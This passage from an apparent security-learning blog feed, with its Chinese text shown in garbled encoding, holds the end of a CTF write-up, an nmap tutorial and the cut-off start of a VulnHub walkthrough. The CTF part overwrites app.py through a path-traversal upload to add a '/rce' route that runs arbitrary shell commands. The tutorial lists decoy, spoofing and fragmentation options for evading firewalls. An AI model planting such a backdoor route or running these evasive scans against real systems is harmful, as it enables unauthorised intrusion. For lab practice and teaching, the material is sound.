class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_files</span>():<br>    subprocess.run(<br>        [<span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">f&#x27;cd <span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;UPLOAD_FOLDER&quot;</span>]&#125;</span> &amp;&amp; tar -cvf ../archive.tar *&#x27;</span>]<br>    )<br><br>    <span class="hljs-keyword">return</span> send_from_directory(<br>        directory=<span class="hljs-string">&#x27;.&#x27;</span>,<br>        path=<span class="hljs-string">&#x27;archive.tar&#x27;</span>,<br>        as_attachment=<span class="hljs-literal">True</span><br>    )<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure><p>ä¸€å…±æœ‰å››ä¸ªè·¯ç”±</p><ul><li><code>/upload</code>å¯ä»¥ä¸Šä¼ æ–‡ä»¶</li><li><code>/list</code>å¯ä»¥æŸ¥çœ‹ä¸Šä¼ åœ¨<code>/uploads</code>ç›®å½•ä¸‹çš„æ–‡ä»¶</li><li><code>/delete</code>å¯ä»¥åˆ é™¤æ‰€æœ‰åœ¨<code>/uploads</code>ç›®å½•ä¸‹çš„æ–‡ä»¶</li><li><code>/download</code>å¯ä»¥å°†æ‰€æœ‰åœ¨<code>/uploads</code>ç›®å½•ä¸‹çš„æ–‡ä»¶æ‰“åŒ…æˆ<code>archive.tar</code>ä¸‹è½½ä¸‹æ¥</li></ul><p>æ ¹æ®ç»™çš„é¢˜ç›®é™„ä»¶çš„æ–‡ä»¶ç›®å½•åˆ†å¸ƒå¯çŸ¥ï¼Œ<code>app.py</code>æ–‡ä»¶æ˜¯åœ¨<code>uploads</code>ç›®å½•çš„ä¸Šä¸€çº§ï¼Œå¦‚æœæ²¡æœ‰å¯¹æ–‡ä»¶åå­—è¿›è¡Œè¿‡æ»¤ï¼Œå°±å¯ä»¥å°è¯•æ„é€ å‡º<code>../app.py</code>çš„æ–‡ä»¶åï¼Œåˆ©ç”¨<code>upload</code>è·¯ç”±ä¸Šä¼ æ–‡ä»¶å¹¶ä¸”è¦†ç›–æ‰æºæ–‡ä»¶<code>app.py</code>ï¼Œå¯ä»¥åœ¨ä¸Šä¼ çš„æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªå¯ä»¥RCEçš„è·¯ç”±ï¼Œè¿›è€Œåœ¨è¦†ç›–æ‰æºæ–‡ä»¶åå¯ä»¥è¿›è¡ŒRCE</p><p>ç›´æ¥åœ¨é¢˜ç›®é™„ä»¶æ‰€ç»™çš„<code>app.py</code>ä¸­æ·»åŠ å¯ä»¥RCEçš„è·¯ç”±</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/rce&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec_cmd</span>():<br>    cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)<br>    output = subprocess.getoutput(cmd)<br>    <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨BurpSuiteæŠ“åŒ…è¿›è€Œæ„é€ æ–‡ä»¶åä¸º<code>../app.py</code></p><p><img src="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/image-20250429202658946.png" alt="image-20250429202658946"></p><p>æœ€åå°±å¯ä»¥è®¿é—®<code>/rce</code>è·¯ç”±æ‰§è¡ŒRCE</p><p><img src="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/image-20250429202743223.png" alt="image-20250429202743223"></p>]]></content>
    
    
    <categories>
      
      <category>åˆ·é¢˜ç»ƒä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶ä¸Šä¼  æºç è¦†ç›–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nmapçš„ä½¿ç”¨</title>
    <link href="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/2302_82189125/article/details/135961736">https://blog.csdn.net/2302_82189125/article/details/135961736</a></p></blockquote><h1 id="nmapçš„ä¸»è¦åŠŸèƒ½"><a href="#nmapçš„ä¸»è¦åŠŸèƒ½" class="headerlink" title="nmapçš„ä¸»è¦åŠŸèƒ½"></a><code>nmap</code>çš„ä¸»è¦åŠŸèƒ½</h1><p>kaliè‡ªå¸¦<code>nmap</code>ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨</p><ul><li><strong>ä¸»æœºå‘ç°ï¼š</strong> Nmap å¯ä»¥é€šè¿‡å‘é€ç½‘ç»œæ¢æµ‹åŒ…ï¼ˆ<code>ping</code> æ‰«æï¼‰æ¥ç¡®å®šä¸€ä¸ªç½‘ç»œä¸­æ´»è·ƒçš„ä¸»æœºã€‚è¿™æœ‰åŠ©äºç¡®å®šå“ªäº› IP åœ°å€ä¸Šæœ‰æ´»åŠ¨çš„è®¾å¤‡ã€‚</li><li><strong>ç«¯å£æ‰«æï¼š</strong> Nmap å¯ä»¥æ‰«æç›®æ ‡ä¸»æœºçš„å¼€æ”¾ç«¯å£ï¼Œå¸®åŠ©ç¡®å®šå“ªäº›æœåŠ¡æ­£åœ¨è¿è¡Œã€‚å®ƒæ”¯æŒå¤šç§æ‰«ææŠ€æœ¯ï¼ŒåŒ…æ‹¬ TCP æ‰«æã€UDP æ‰«æã€SYN&#x2F;ACK æ‰«æç­‰ã€‚</li><li><strong>æœåŠ¡è¯†åˆ«ï¼š</strong> Nmap å¯ä»¥è¯†åˆ«ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œçš„å…·ä½“æœåŠ¡å’Œåº”ç”¨ç¨‹åºçš„ç‰ˆæœ¬å·ã€‚è¿™å¯¹äºäº†è§£ç›®æ ‡ç³»ç»Ÿä¸Šå¯èƒ½å­˜åœ¨çš„æ¼æ´å’Œå¼±ç‚¹å¾ˆæœ‰å¸®åŠ©ã€‚</li><li><strong>æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼š</strong> Nmap èƒ½å¤Ÿå°è¯•æ£€æµ‹ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬ã€‚è¿™æœ‰åŠ©äºè¯†åˆ«ç½‘ç»œä¸­çš„ä¸åŒæ“ä½œç³»ç»Ÿï¼Œå¹¶ä¸ºåç»­çš„æ¸—é€æµ‹è¯•æä¾›ä¿¡æ¯ã€‚</li><li><strong>è„šæœ¬æ‰«æï¼š</strong> Nmap æ”¯æŒè„šæœ¬æ‰«æï¼Œå…è®¸ç”¨æˆ·æ‰§è¡Œè‡ªå®šä¹‰è„šæœ¬ä»¥è¿›è¡Œæ›´æ·±å…¥çš„ä¿¡æ¯æ”¶é›†å’Œå®‰å…¨å®¡è®¡ã€‚</li><li><strong>ç‰ˆæœ¬æ£€æµ‹ï¼š</strong> Nmap å¯ä»¥æ£€æµ‹ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œçš„æœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚è¿™å¯¹äºç¡®å®šç›®æ ‡ç³»ç»Ÿä¸Šå¯èƒ½å­˜åœ¨çš„å·²çŸ¥æ¼æ´å’Œå®‰å…¨é—®é¢˜éå¸¸æœ‰ç”¨ã€‚</li><li><strong>è¾“å‡ºæ ¼å¼ï¼š</strong> Nmap å¯ä»¥ç”Ÿæˆå¤šç§è¾“å‡ºæ ¼å¼ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€XMLã€JSON ç­‰ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥çš„åˆ†æå’ŒæŠ¥å‘Šã€‚</li></ul><h1 id="nmapçš„ä½¿ç”¨æ–¹æ³•"><a href="#nmapçš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="nmapçš„ä½¿ç”¨æ–¹æ³•"></a><code>nmap</code>çš„ä½¿ç”¨æ–¹æ³•</h1><h2 id="ä¸»æœº"><a href="#ä¸»æœº" class="headerlink" title="ä¸»æœº"></a>ä¸»æœº</h2><h3 id="å¿«é€Ÿæ‰«æ"><a href="#å¿«é€Ÿæ‰«æ" class="headerlink" title="å¿«é€Ÿæ‰«æ"></a>å¿«é€Ÿæ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ‰«æ 192.168.1.102ï¼Œæ£€æµ‹å¼€æ”¾çš„ç«¯å£å’ŒæœåŠ¡</span><br>nmap 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426151805995.png" alt="image-20250426151805995"></p><h3 id="æ‰«æå¤šä¸ªç›®æ ‡"><a href="#æ‰«æå¤šä¸ªç›®æ ‡" class="headerlink" title="æ‰«æå¤šä¸ªç›®æ ‡"></a>æ‰«æå¤šä¸ªç›®æ ‡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip ip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ‰«æ 192.168.1.102 å’Œ 192.168.1.103ï¼Œæ£€æµ‹å¼€æ”¾çš„ç«¯å£å’ŒæœåŠ¡</span><br>nmap 192.168.1.102 192.168.1.103<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426152013156.png" alt="image-20250426152013156"></p><h3 id="ç½‘æ®µæ‰«æ"><a href="#ç½‘æ®µæ‰«æ" class="headerlink" title="ç½‘æ®µæ‰«æ"></a>ç½‘æ®µæ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip/å­ç½‘æ©ç <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ‰«æ 192.168.1.103 æ‰€åœ¨çš„å­ç½‘</span><br><span class="hljs-comment"># ä¼šæ‰«æ 192.168.1.0 åˆ° 192.168.1.255 èŒƒå›´å†…çš„æ‰€æœ‰ IP åœ°å€ï¼ŒæŸ¥æ‰¾å­˜æ´»ä¸»æœºã€å¼€æ”¾ç«¯å£å’ŒæœåŠ¡</span><br>nmap 192.168.1.0/24<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426153051960.png" alt="image-20250426153051960"></p><h3 id="è¿‡æ»¤IPçš„ç½‘æ®µæ‰«æ"><a href="#è¿‡æ»¤IPçš„ç½‘æ®µæ‰«æ" class="headerlink" title="è¿‡æ»¤IPçš„ç½‘æ®µæ‰«æ"></a>è¿‡æ»¤IPçš„ç½‘æ®µæ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip/å­ç½‘æ©ç  -exclude éœ€è¦è¿‡æ»¤çš„ipæˆ–æ–‡ä»¶<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ‰«æ 192.168.1.0/24 å­ç½‘ä¸­çš„æ‰€æœ‰ä¸»æœºï¼Œä½†æ’é™¤ 192.168.1.1</span><br>nmap 192.168.1.103/24 -exclude 192.168.1.1<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426152436796.png" alt="image-20250426152436796"></p><h3 id="ä»…æ‰«æå­˜æ´»ä¸»æœº"><a href="#ä»…æ‰«æå­˜æ´»ä¸»æœº" class="headerlink" title="ä»…æ‰«æå­˜æ´»ä¸»æœº"></a>ä»…æ‰«æå­˜æ´»ä¸»æœº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sP ip/å­ç½‘æ©ç <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åªæ‰«æ 192.168.1.103 æ‰€åœ¨çš„å­ç½‘çš„æ‰€æœ‰å­˜æ´»ä¸»æœº</span><br>nmap -sP 192.168.1.0/24<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426153445425.png" alt="image-20250426153445425"></p><h2 id="ç«¯å£"><a href="#ç«¯å£" class="headerlink" title="ç«¯å£"></a>ç«¯å£</h2><p><strong>ç«¯å£çŠ¶æ€6ç§çŠ¶æ€</strong></p><ul><li><strong><code>openï¼ˆå¼€æ”¾çš„ï¼‰</code></strong>ï¼šç«¯å£ä¸Šæœ‰åº”ç”¨ç¨‹åºæ­£åœ¨ç›‘å¬å¹¶å“åº”æ¢æµ‹</li><li><strong><code>closedï¼ˆå…³é—­çš„ï¼‰</code></strong>ï¼šç«¯å£ä¸å“åº”æ¢æµ‹ï¼Œå¯èƒ½è¢«é˜²ç«å¢™å°é”æˆ–æ— åº”ç”¨ç¨‹åºç›‘å¬</li><li><strong><code>filteredï¼ˆè¢«è¿‡æ»¤çš„ï¼‰</code></strong>ï¼šç«¯å£è¢«é˜²ç«å¢™ç­‰è®¾å¤‡è¿‡æ»¤ï¼Œæ— æ³•ç¡®å®šæ˜¯å¦å¼€æ”¾ã€‚</li><li><strong><code>unfilteredï¼ˆæœªè¢«è¿‡æ»¤çš„ï¼‰</code></strong>ï¼šç«¯å£å¯è®¿é—®ï¼Œä½†æ— æ³•ç¡®å®šæ˜¯å¼€æ”¾è¿˜æ˜¯å…³é—­ã€‚</li><li><strong><code>open|filteredï¼ˆå¼€æ”¾æˆ–è€…è¢«è¿‡æ»¤çš„ï¼‰</code></strong>ï¼šç«¯å£å¯èƒ½å¼€æ”¾ï¼Œä¹Ÿå¯èƒ½è¢«è¿‡æ»¤ï¼Œéœ€è¦è¿›ä¸€æ­¥æ¢æµ‹ã€‚</li><li><strong><code>closed|filteredï¼ˆå…³é—­æˆ–è€…è¢«è¿‡æ»¤çš„ï¼‰</code></strong>ï¼šç«¯å£å¯èƒ½å…³é—­ï¼Œä¹Ÿå¯èƒ½è¢«è¿‡æ»¤ï¼Œä»…åœ¨ç‰¹å®šæ‰«æä¸­å‡ºç°ã€‚</li></ul><h3 id="æ‰«æç«¯å£"><a href="#æ‰«æç«¯å£" class="headerlink" title="æ‰«æç«¯å£"></a>æ‰«æç«¯å£</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip -p ç«¯å£å·<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ‰«æ IP ä¸º 192.168.1.102 çš„ 22 ç«¯å£</span><br>nmap 192.168.1.102 -p 22<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426154157875.png" alt="image-20250426154157875"></p><h3 id="ç«¯å£èŒƒå›´æ‰«æ"><a href="#ç«¯å£èŒƒå›´æ‰«æ" class="headerlink" title="ç«¯å£èŒƒå›´æ‰«æ"></a>ç«¯å£èŒƒå›´æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip -p èŒƒå›´<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ‰«æ IP ä¸º 192.168.1.102 çš„ 1 åˆ° 100 ç«¯å£</span><br>nmap 192.168.1.102 -p 1-100<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426154559761.png" alt="image-20250426154559761"></p><h2 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h2><h3 id="è¯†åˆ«æœåŠ¡ç‰ˆæœ¬"><a href="#è¯†åˆ«æœåŠ¡ç‰ˆæœ¬" class="headerlink" title="è¯†åˆ«æœåŠ¡ç‰ˆæœ¬"></a>è¯†åˆ«æœåŠ¡ç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV ip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¯†åˆ« 192.168.1.102 çš„æœåŠ¡</span><br>nmap -sV 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426155116268.png" alt="image-20250426155116268"></p><h3 id="è¯†åˆ«å…·ä½“ç«¯å£çš„æœåŠ¡"><a href="#è¯†åˆ«å…·ä½“ç«¯å£çš„æœåŠ¡" class="headerlink" title="è¯†åˆ«å…·ä½“ç«¯å£çš„æœåŠ¡"></a>è¯†åˆ«å…·ä½“ç«¯å£çš„æœåŠ¡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV ip -p ç«¯å£å·æˆ–èŒƒå›´<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV 192.168.1.102 -p 22<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426155211943.png" alt="image-20250426155211943"></p><h2 id="ç³»ç»Ÿ"><a href="#ç³»ç»Ÿ" class="headerlink" title="ç³»ç»Ÿ"></a>ç³»ç»Ÿ</h2><h3 id="è¯†åˆ«æ“ä½œç³»ç»Ÿ"><a href="#è¯†åˆ«æ“ä½œç³»ç»Ÿ" class="headerlink" title="è¯†åˆ«æ“ä½œç³»ç»Ÿ"></a>è¯†åˆ«æ“ä½œç³»ç»Ÿ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -O ip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¯†åˆ« 192.168.1.102 ä¸»æœºä¸Šè¿è¡Œçš„æ“ä½œç³»ç»Ÿï¼ˆéœ€è¦rootæƒé™ï¼‰</span><br>nmap -O 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426155629610.png" alt="image-20250426155629610"></p><h2 id="æ‰«ææ–¹å¼"><a href="#æ‰«ææ–¹å¼" class="headerlink" title="æ‰«ææ–¹å¼"></a>æ‰«ææ–¹å¼</h2><h3 id="TCP-SYN-æ‰«æ"><a href="#TCP-SYN-æ‰«æ" class="headerlink" title="TCP SYN æ‰«æ"></a>TCP SYN æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sS ip<br></code></pre></td></tr></table></figure><h3 id="TCP-connect-æ‰«æ"><a href="#TCP-connect-æ‰«æ" class="headerlink" title="TCP connect() æ‰«æ"></a>TCP connect() æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ­¤æ‰«æä¸ºé»˜è®¤æ‰«æï¼Œä¸ç”¨åŠ å‚æ•°<br></code></pre></td></tr></table></figure><h3 id="UDP-æ‰«æ"><a href="#UDP-æ‰«æ" class="headerlink" title="UDP æ‰«æ"></a>UDP æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sU ip<br></code></pre></td></tr></table></figure><h3 id="TCP-Null-æ‰«æ"><a href="#TCP-Null-æ‰«æ" class="headerlink" title="TCP Null æ‰«æ"></a>TCP Null æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN ip<br></code></pre></td></tr></table></figure><h3 id="TCP-FIN-æ‰«æ"><a href="#TCP-FIN-æ‰«æ" class="headerlink" title="TCP FIN æ‰«æ"></a>TCP FIN æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sF ip<br></code></pre></td></tr></table></figure><h3 id="TCP-Xmas-æ‰«æ"><a href="#TCP-Xmas-æ‰«æ" class="headerlink" title="TCP Xmas æ‰«æ"></a>TCP Xmas æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sX ip<br></code></pre></td></tr></table></figure><h3 id="TCP-ACK-æ‰«æ"><a href="#TCP-ACK-æ‰«æ" class="headerlink" title="TCP ACK æ‰«æ"></a>TCP ACK æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sA ip<br></code></pre></td></tr></table></figure><h3 id="TCP-çª—å£æ‰«æ"><a href="#TCP-çª—å£æ‰«æ" class="headerlink" title="TCP çª—å£æ‰«æ"></a>TCP çª—å£æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sW ip<br></code></pre></td></tr></table></figure><h3 id="TCP-Maimon-æ‰«æ"><a href="#TCP-Maimon-æ‰«æ" class="headerlink" title="TCP Maimon æ‰«æ"></a>TCP Maimon æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sM ip<br></code></pre></td></tr></table></figure><h2 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h2><h3 id="æŠ¥æ–‡åˆ†æ®µ"><a href="#æŠ¥æ–‡åˆ†æ®µ" class="headerlink" title="æŠ¥æ–‡åˆ†æ®µ"></a>æŠ¥æ–‡åˆ†æ®µ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -f ip<br></code></pre></td></tr></table></figure><h3 id="æœ€å¤§ä¼ è¾“å•å…ƒ"><a href="#æœ€å¤§ä¼ è¾“å•å…ƒ" class="headerlink" title="æœ€å¤§ä¼ è¾“å•å…ƒ"></a>æœ€å¤§ä¼ è¾“å•å…ƒ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --mtu 1500 ip<br></code></pre></td></tr></table></figure><h3 id="è¯±é¥µéšè—æ‰«æ"><a href="#è¯±é¥µéšè—æ‰«æ" class="headerlink" title="è¯±é¥µéšè—æ‰«æ"></a>è¯±é¥µéšè—æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -D &lt;ip,ip,ipâ€¦â€¦&gt; ç›®æ ‡ ip<br></code></pre></td></tr></table></figure><h3 id="æºåœ°å€å“„éª—"><a href="#æºåœ°å€å“„éª—" class="headerlink" title="æºåœ°å€å“„éª—"></a>æºåœ°å€å“„éª—</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -S &lt;ä¼ªè£…çš„æº ip&gt; ip<br></code></pre></td></tr></table></figure><h3 id="æºç«¯å£å“„éª—"><a href="#æºç«¯å£å“„éª—" class="headerlink" title="æºç«¯å£å“„éª—"></a>æºç«¯å£å“„éª—</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --source-port æˆ– -g &lt;æºç«¯å£å·&gt; ip<br></code></pre></td></tr></table></figure><h3 id="é™„åŠ éšæœºæ•°æ®"><a href="#é™„åŠ éšæœºæ•°æ®" class="headerlink" title="é™„åŠ éšæœºæ•°æ®"></a>é™„åŠ éšæœºæ•°æ®</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --data-length &lt;é•¿åº¦&gt; ip<br></code></pre></td></tr></table></figure><h3 id="ç”Ÿå­˜æ—¶é—´"><a href="#ç”Ÿå­˜æ—¶é—´" class="headerlink" title="ç”Ÿå­˜æ—¶é—´"></a>ç”Ÿå­˜æ—¶é—´</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --ttl &lt;å€¼&gt; ip<br></code></pre></td></tr></table></figure><h3 id="MAC-åœ°å€å“„éª—"><a href="#MAC-åœ°å€å“„éª—" class="headerlink" title="MAC åœ°å€å“„éª—"></a>MAC åœ°å€å“„éª—</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --spoof-mac &lt;mac åœ°å€&gt; ip<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æ‰“é¶å°çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¸—é€æ‰“é¶ å°çŸ¥è¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VulnHubé¶æœºEarthå¤ç°</title>
    <link href="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å€Ÿé‰´æ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/Czheisenberg/article/details/122900121">https://blog.csdn.net/Czheisenberg/article/details/122900121</a></p><p><a href="https://www.cnblogs.com/sainet/p/15638010.html">https://www.cnblogs.com/sainet/p/15638010.html</a></p></blockquote><h1 id="å®‰è£…é¶æœº"><a href="#å®‰è£…é¶æœº" class="headerlink" title="å®‰è£…é¶æœº"></a>å®‰è£…é¶æœº</h1><p>é¶æœºç½‘å€ï¼š<a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p><p>VirtualBoxç½‘å€ï¼š<a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p><h1 id="IPæ¢æµ‹"><a href="#IPæ¢æµ‹" class="headerlink" title="IPæ¢æµ‹"></a>IPæ¢æµ‹</h1><h3 id="å¯»æ‰¾é¶æœº"><a href="#å¯»æ‰¾é¶æœº" class="headerlink" title="å¯»æ‰¾é¶æœº"></a>å¯»æ‰¾é¶æœº</h3><p>è¦ç¡®ä¿é¶æœºå’Œkaliéƒ½å‡ºäºåŒä¸€ä¸ªç½‘æ®µä¸Šï¼ˆå¯ä»¥éƒ½æ˜¯ç”¨æ¡¥è¿æ–¹å¼ï¼‰</p><p>å…ˆæŸ¥çœ‹kaliçš„IP</p><figure class="highlight bash"><table><tr><td 